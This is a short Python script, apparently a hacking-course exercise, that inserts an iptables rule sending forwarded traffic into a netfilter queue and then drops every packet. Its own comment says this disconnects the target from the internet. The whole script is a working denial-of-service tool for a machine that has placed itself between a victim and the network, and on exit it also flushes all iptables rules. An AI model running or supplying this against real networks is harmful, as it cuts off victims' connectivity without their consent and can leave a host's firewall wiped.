#!/usr/bin/env python
'''
use iptables to modify packet routes
iptables allows us to trap all of our packets in a queque

At the BEGINNING
run the following command:
(Against remote computer)
iptables -I FORWARD -j NFQUEUE --queue-num 0
*Only forward chain will be redirected to a queue*
(Against local computer)
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
*Input and output chain will both be redirected to a queue*


AT The END
run the following command:
iptables --flush

REQUIREMENTS:
pip install netfilterqueue
enable packet forwarding on machine
'''

import netfilterqueue
import subprocess

def process_packet(packet):
    print(packet)
    packet.drop() #pretty much disconnects the internet from the target

try:
    print("[+] Creating packet queue")
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[-] Removing packet queue")
    subprocess.call(["iptables", "--flush"])


